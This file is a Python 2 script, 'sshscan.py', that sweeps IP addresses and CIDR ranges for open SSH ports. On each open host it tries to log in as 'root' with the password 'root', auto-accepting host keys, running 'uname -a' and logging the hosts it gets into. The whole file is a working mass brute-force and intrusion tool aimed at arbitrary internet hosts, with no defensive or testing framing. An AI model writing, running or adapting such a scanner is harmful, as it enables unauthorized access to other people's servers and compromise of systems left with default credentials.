# sshscan.py - Horizontal SSH scanner
# by dual
#
# sshscan.py is a horizontal SSH scanner, made to scan large
# swaths of IP space for a single SSH user and pass. It uses
# ip_list.txt as the input for IP addresses in the form of
# X.X.X.X or X.X.X.X/XX.
#
# Usage: python -u sshscan.py
#
# IP country database:
# http://geolite.maxmind.com/download/geoip/database/GeoIPCountryCSV.zip
#
# checkServer code by Brad Peters:
# brad (at) endperform (dot) org
#
# SSH with pexpect example:
# http://linux.byexamples.com/archives/346/python-how-to-access-ssh-with-pexpect/

import datetime
import netaddr
import os
import pexpect
import random
import re
import socket
import sys

# DEFINE CNNX STRING, USER AND PASS
CNNX = 'Are you sure you want to continue connecting'
USER = 'root'
PASS = 'root'
    
# This code actually attempts to check the SSH port
def checkServer(ip_from_list):
    serverSocket = socket.socket()
    serverSocket.settimeout(0.5)
    try:
        serverSocket.connect((ip_from_list, 22))
    except socket.error:
        return 1

# SSH connection function
def cnnxAttempt(target):
    child = pexpect.spawn('ssh %s@%s uname -a' % (USER, target))

    try:
        i = child.expect([CNNX, '[Pp]assword: ', pexpect.EOF])
        if i == 0:
            print "Sending 'yes'..."
            child.sendline('yes')
            i = child.expect([CNNX, '[Pp]assword: ', pexpect.EOF])
        if i == 1:
            print "Sending password...",
            child.sendline(PASS)
            child.expect(pexpect.EOF, timeout=5)
        elif i == 2:
            print "Connection failed"
            pass

        # Print output
        print child.before
        output.write(child.before)

    except:
        print "Unexpected error:", sys.exc_info()[0]

# Get date for output file 
today = datetime.datetime.now()
date = today.strftime("%Y%m%dT%H%M")
output_filename = 'sshscan_output-' + date + '.txt'

input  = open('ip_list.txt', 'r')
output = open(output_filename, 'w')

# Randomize lines in input file
rand_lines = input.readlines()
random.shuffle(rand_lines)

# Get total number of lines
total_lines = len(rand_lines)
count_lines = 0

# Iterate through IPs and check SSH
for line in rand_lines:
    count_lines += 1

    newline = line.strip()

    match_comments = re.search('^#', newline)
    if match_comments:
        continue

    match_ip = re.search('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', newline)
    if match_ip:
        # If status is defined, we know the connection failed
        status = checkServer(newline)
        if status:
            print "%d/%d \tHost: %s \tPort: 22/closed" % (count_lines, total_lines, newline)
        else:
            print "%d/%d \tHost: %s \tPort: 22/open" % (count_lines, total_lines, newline)
            output.write('Host: ' + newline + '\tPort: 22/open\n')
            cnnxAttempt(newline)

    match_cidr = re.search('\/\d{1,2}$', newline)
    if match_cidr:
        # Randomize lines in netblocks
        ip_list = netaddr.IPNetwork(newline)
        rand_ip_list = list(ip_list)
        random.shuffle(rand_ip_list)

        # Get total number of IPs
        total_ips = len(rand_ip_list)
        count_ips = 0

        for ip in rand_ip_list:
            count_ips += 1

            # Don't scan network and broadcast addresses
            match_badip = re.search('\.(0|255)$', str(ip))
            if match_badip:
                continue
            # If status is defined, we know the connection failed
            status = checkServer(str(ip))
            if status:
                print "%d/%d (%d/%d) \tHost: %s \tPort: 22/closed" % (count_lines, total_lines, count_ips, total_ips, str(ip))
            else:
                print "%d/%d (%d/%d) \tHost: %s \tPort: 22/open" % (count_lines, total_lines, count_ips, total_ips, str(ip))
                output.write('Host: ' + str(ip) + '\tPort: 22/open\n')
                cnnxAttempt(str(ip))

output.close()
